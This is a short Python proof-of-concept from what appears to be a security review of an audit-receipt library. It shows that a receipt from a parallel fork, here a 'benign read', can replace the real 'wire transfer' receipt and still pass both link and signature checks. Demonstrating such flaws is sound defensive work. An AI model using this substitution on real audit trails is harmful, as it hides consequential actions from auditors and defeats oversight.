#!/usr/bin/env python3
"""PoC 3 — S2.3/S2.4: CROSS-FORK REPLAY — no chain-identity binding.

Receipts carry prev_chain_hash but no chain/genesis identifier. A receipt
from fork B validates inside fork A whenever the forks share a parent hash.
An auditor shown [r1, r2_alt] cannot tell that the real chain was [r1, r2]:
the substituted receipt's link AND signature both verify.
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (build_receipt, chain_hash, generate_keypair,
                         verify_chain, sha256_hex)

HUMAN = {"type": "human", "id": "s.lutar", "is_service_account": False,
         "auth_method": "hardware_key", "human_principal": "Stephen P. Lutar"}
POL = {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]
EXEC = {"side_effect_class": "WRITE_REVERSIBLE", "status": "EXECUTED"}

sk, pk = generate_keypair()
r1 = build_receipt(action_id="a-001", subject_name="prod:svc", actor=HUMAN,
                   policy_decision=POL, execution=EXEC, evidence_items=EV,
                   prev_chain_hash="GENESIS", signing_key=sk)
# Real history (chain A)
r2 = build_receipt(action_id="a-002-REAL-wire-transfer", subject_name="prod:svc",
                   actor=HUMAN, policy_decision=POL, execution=EXEC,
                   evidence_items=EV, prev_chain_hash=chain_hash(r1), signing_key=sk)
# Abandoned/parallel fork B, same parent
r2_alt = build_receipt(action_id="a-002-ALT-benign-read", subject_name="prod:svc",
                       actor=HUMAN, policy_decision=POL,
                       execution={"side_effect_class": "READ_ONLY", "status": "EXECUTED"},
                       evidence_items=EV, prev_chain_hash=chain_hash(r1), signing_key=sk)

real = verify_chain([r1, r2], pk)
swapped = verify_chain([r1, r2_alt], pk)   # fork-B receipt replayed into chain A's slot
print("real    [r1,r2]     all_links_valid:", real["all_links_valid"],
      "actions:", [v["action_id"] for v in real["verdicts"]])
print("swapped [r1,r2_alt] all_links_valid:", swapped["all_links_valid"],
      "actions:", [v["action_id"] for v in swapped["verdicts"]])

# Unexpected valid: spliced fork lineage is indistinguishable from the real chain
if swapped["all_links_valid"] is True:
    print("EXPLOIT-WORKS")
else:
    print("HELD")
